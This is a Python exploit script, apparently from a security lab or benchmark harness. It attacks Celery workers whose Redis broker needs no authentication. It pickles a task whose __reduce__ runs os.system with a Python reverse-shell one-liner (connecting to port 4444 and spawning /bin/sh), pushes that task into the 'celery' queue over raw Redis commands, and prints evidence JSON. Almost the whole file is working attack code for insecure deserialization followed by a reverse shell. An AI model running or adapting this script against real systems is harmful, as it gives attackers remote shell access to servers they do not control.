#!/usr/bin/env python3
"""Send a pickle task through an unauthenticated Celery Redis broker."""

import json
import os
import pickle
import socket
import time
import urllib.parse
import urllib.request
import uuid


class ShellPayload:
    def __init__(self, command: str):
        self.command = command

    def __reduce__(self):
        return os.system, (self.command,)


def shell_command() -> str:
    code = (
        'import os,socket;'
        's=socket.create_connection(("127.0.0.1",4444));'
        '[os.dup2(s.fileno(),fd) for fd in (0,1,2)];'
        'os.execl("/bin/sh","sh","-i")'
    )
    return "python -c '" + code + "'"


def broker_message() -> bytes:
    task = {
        "task": "tasks.add",
        "id": str(uuid.uuid4()),
        "args": [1, 2],
        "kwargs": {},
        "extra": ShellPayload(shell_command()),
    }
    body = pickle.dumps(task, protocol=0).decode("ascii")
    message = {
        "body": body,
        "delivery_tag": str(uuid.uuid4()),
        "priority": 0,
        "content-type": "application/x-python-serialize",
        "content-encoding": "binary",
        "destination": "celery",
    }
    return json.dumps(message, separators=(",", ":")).encode("utf-8")


def redis_command(connection: socket.socket, parts: list[bytes]) -> bytes:
    command = b"*" + str(len(parts)).encode("ascii") + b"\r\n"
    for part in parts:
        command += b"$" + str(len(part)).encode("ascii") + b"\r\n" + part + b"\r\n"
    connection.sendall(command)
    return connection.recv(128)


def main() -> None:
    target_url = os.environ["REMOTE_TARGET_URL"]
    with urllib.request.urlopen(target_url, timeout=15) as response:
        if response.status != 200:
            raise RuntimeError("Celery worker is not ready")
    host = urllib.parse.urlsplit(target_url).hostname
    if not host:
        raise RuntimeError("Target URL has no hostname")
    broker_port = int(os.environ.get("REMOTE_REDIS_PORT", "6379"))
    with socket.create_connection((host, broker_port), timeout=15) as connection:
        if redis_command(connection, [b"PING"]) != b"+PONG\r\n":
            raise RuntimeError("Unauthenticated Redis PING failed")
        reply = redis_command(connection, [b"RPUSH", b"celery", broker_message()])
    if not reply.startswith(b":"):
        raise RuntimeError(f"Redis did not queue message: {reply!r}")
    time.sleep(2)
    print(json.dumps({"evidence_payload": {
        "broker_reply": reply.decode("ascii").strip(),
        "queue": "celery",
    }}))


if __name__ == "__main__":
    main()
